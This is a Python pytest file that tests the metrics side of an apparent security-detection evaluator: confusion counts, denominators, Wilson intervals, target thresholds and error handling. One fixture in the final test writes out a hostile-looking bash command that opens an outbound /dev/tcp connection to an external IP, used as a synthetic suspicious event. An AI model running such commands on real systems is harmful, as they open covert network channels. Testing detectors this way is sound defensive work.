"""Measurement is tested independently from detection efficacy."""

import json
from copy import deepcopy

import pytest

from scripts import evaluate
from scripts.evaluation_metrics import classify, input_audit, summarize, target_status, wilson_interval


def sample(label=False, command="id"):
    return {
        "id": "sample",
        "suspicious": label,
        "reason": "Synthetic evaluator contract, not deployment evidence",
        "expected_rule_ids": [],
        "events": [
            {
                "source": "synthetic",
                "sensor": "metric-test",
                "payload": {
                    "host": "metric-host",
                    "timestamp": "2026-11-15T09:00:00Z",
                    "kind": "process",
                    "process": "/usr/bin/id",
                    "command": command,
                },
            }
        ],
    }


def write_dataset(tmp_path, scenarios):
    path = tmp_path / "dataset.json"
    path.write_text(json.dumps(scenarios))
    return path


@pytest.mark.parametrize(
    "label,predicted,expected",
    [
        (True, True, "TP"),
        (False, True, "FP"),
        (False, False, "TN"),
        (True, False, "FN"),
    ],
)
def test_confusion_outcomes(label, predicted, expected):
    assert classify(label, predicted) == expected


def test_metrics_and_denominators():
    report = summarize(
        [
            {"label": truth, "alerted": pred}
            for truth, pred in [(True, True), (True, False), (False, True), (False, False)]
        ]
    )
    assert report["confusion_matrix"] == {"TP": 1, "FP": 1, "TN": 1, "FN": 1}
    assert all(report[key] == 0.5 for key in ["precision", "recall", "accuracy", "false_positive_rate"])
    assert report["denominators"] == {
        "total": 4,
        "positive": 2,
        "negative": 2,
        "predicted_positive": 2,
        "classified": 4,
        "errors": 0,
    }


def test_null_denominators_and_errors_never_become_benign():
    assert all(
        summarize([])[key] is None for key in ["precision", "recall", "accuracy", "false_positive_rate"]
    )
    report = summarize([{"label": False, "alerted": False}])
    assert report["precision"] is None and report["recall"] is None
    assert report["false_positive_rate"] == 0 and report["accuracy"] == 1
    failed = summarize([{"label": False, "alerted": None}, {"label": True, "alerted": True}])
    assert failed["denominators"]["total"] == 2
    assert failed["denominators"]["negative"] == 1
    assert failed["denominators"]["errors"] == 1
    assert failed["confusion_matrix"]["TN"] == 0
    assert failed["accuracy"] is None and not target_status(failed)["passed"]


@pytest.mark.parametrize(
    "key,value",
    [
        ("precision", 0.9),
        ("recall", 0.9),
        ("accuracy", 0.9),
        ("false_positive_rate", 0.05),
        ("precision", None),
        ("precision", float("nan")),
    ],
)
def test_strict_target_boundaries(key, value):
    values = {"precision": 1.0, "recall": 1.0, "accuracy": 1.0, "false_positive_rate": 0.0}
    assert target_status(values)["passed"]
    values[key] = value
    assert not target_status(values)["passed"]


def test_wilson_bounds_show_tiny_zero_fp_sample_uncertainty():
    interval = wilson_interval(0, 9)
    assert interval["method"] == "Wilson score, two-sided 95%"
    assert interval["lower"] == 0
    assert 0.29 < interval["upper"] < 0.31
    assert wilson_interval(0, 0)["lower"] is None
    assert wilson_interval(9, 9)["upper"] == 1


def test_identical_opposite_inputs_and_distinguishing_context():
    a, b = sample(True), sample(False)
    b["id"] = "benign"
    audit = input_audit([a, b])
    assert audit["minimum_unavoidable_errors"] == 1
    assert audit["accuracy_upper_bound"] == 0.5
    assert len(audit["contradictions"]) == 1
    b["context"] = {"approvals": [{"reason": "This is different operator evidence"}]}
    assert input_audit([a, b])["minimum_unavoidable_errors"] == 0


def test_no_alerts_and_per_source_rule_reporting(tmp_path):
    report = evaluate.run(write_dataset(tmp_path, [sample()]))
    assert report["valid"]
    assert report["confusion_matrix"] == {"TP": 0, "FP": 0, "TN": 1, "FN": 0}
    assert report["scenarios"][0]["emitted_rule_ids"] == []
    assert report["scenarios"][0]["alert_count"] == 0
    assert report["by_source"]["synthetic"]["denominators"]["total"] == 1
    assert report["latency_ms"]["median"] is None
    assert report["provenance"]["dataset_sha256"]


def test_ingestion_rejection_retained_and_report_written_before_failure(tmp_path):
    bad = sample()
    bad["events"][0]["payload"]["timestamp"] = "no-timezone"
    dataset, output = write_dataset(tmp_path, [bad]), tmp_path / "result.json"
    assert evaluate.main(["--dataset", str(dataset), "--output", str(output)]) == 2
    report = json.loads(output.read_text())
    assert not report["valid"]
    assert report["denominators"]["total"] == report["denominators"]["errors"] == 1
    assert report["scenarios"][0]["classification"] == "ERROR"
    assert report["scenarios"][0]["ingestion"]["rejected"] == 1
    assert report["scenarios"][0]["alerted"] is None
    assert report["false_positive_rate"] is None


def test_empty_bad_json_and_duplicate_ids_are_integrity_errors(tmp_path):
    for scenarios in [[], [sample(), deepcopy(sample())]]:
        report = evaluate.run(write_dataset(tmp_path, scenarios))
        assert not report["valid"] and report["errors"]
    dataset = tmp_path / "broken.json"
    dataset.write_text("{")
    output = tmp_path / "bad-result.json"
    assert evaluate.main(["--dataset", str(dataset), "--output", str(output)]) == 2
    assert json.loads(output.read_text())["errors"]


def test_target_report_written_and_exit_distinguished(tmp_path):
    output = tmp_path / "failed-target.json"
    dataset = write_dataset(tmp_path, [sample()])
    assert evaluate.main(["--dataset", str(dataset), "--require-targets", "--output", str(output)]) == 1
    report = json.loads(output.read_text())
    assert report["valid"] and not report["targets"]["passed"]
    assert report["targets"]["required"]


def test_real_cli_returns_failed_target_after_writing_report(tmp_path):
    import subprocess
    import sys

    output = tmp_path / "cli-target.json"
    dataset = write_dataset(tmp_path, [sample()])
    result = subprocess.run(
        [
            sys.executable,
            str(evaluate.ROOT / "scripts/evaluate.py"),
            "--dataset",
            str(dataset),
            "--require-targets",
            "--output",
            str(output),
        ],
        cwd=evaluate.ROOT,
        capture_output=True,
        text=True,
    )
    assert result.returncode == 1
    assert json.loads(output.read_text())["exit_code"] == 1


def test_full_precision_comparisons_and_environment_isolation(monkeypatch):
    values = {
        "precision": 0.90000000001,
        "recall": 0.90000000001,
        "accuracy": 0.90000000001,
        "false_positive_rate": 0.04999999999,
    }
    assert target_status(values)["passed"]
    monkeypatch.setenv("SF_LOCAL_MODE", "true")
    monkeypatch.setenv("SF_DATABASE_URL", "sqlite:///should-not-exist.db")
    config = evaluate.settings()
    assert not config.local_mode and not config.public_demo
    assert config.database_url == "sqlite:///:memory:"


def test_legacy_contradictions_are_preserved():
    scenarios = json.loads((evaluate.ROOT / "data/evaluation.json").read_text())
    audit = input_audit(scenarios)
    assert audit["minimum_unavoidable_errors"] == 3
    assert audit["accuracy_upper_bound"] == 15 / 18
    assert len(audit["contradictions"]) == 3


def test_manifest_drift_and_detector_failure_keep_denominators(tmp_path, monkeypatch):
    dataset = write_dataset(tmp_path, [sample(True)])
    (tmp_path / "manifest.json").write_text(
        json.dumps({"files": {dataset.name: "wrong-hash"}, "acceptance_dataset": dataset.name})
    )
    report = evaluate.run(dataset)
    assert not report["valid"] and report["denominators"]["total"] == 1
    assert any("manifest" in error.lower() for error in report["errors"])
    (tmp_path / "manifest.json").unlink()

    def fail_detector(*args, **kwargs):
        raise RuntimeError("test detector failure")

    monkeypatch.setattr(evaluate, "create_app", fail_detector)
    report = evaluate.run(dataset)
    assert not report["valid"] and report["denominators"]["positive"] == 1
    assert report["scenarios"][0]["alerted"] is None
    assert report["scenarios"][0].get("rule_contract_match") is None
    assert report["confusion_matrix"]["FN"] == 0


def test_metrics_do_not_credit_wrong_rule_contract(tmp_path):
    event = sample(True)
    event["events"][0]["payload"].update(
        process="/bin/bash", command="bash -c 'echo x >/dev/tcp/1.1.1.1/443'"
    )
    event["expected_rule_ids"] = ["00000000-0000-0000-0000-000000000004"]
    report = evaluate.run(write_dataset(tmp_path, [event]))
    assert report["valid"] and report["confusion_matrix"]["TP"] == 1
    assert report["scenarios"][0]["rule_contract_match"] is False
    assert report["rule_contracts"]["mismatches"] == [event["id"]]
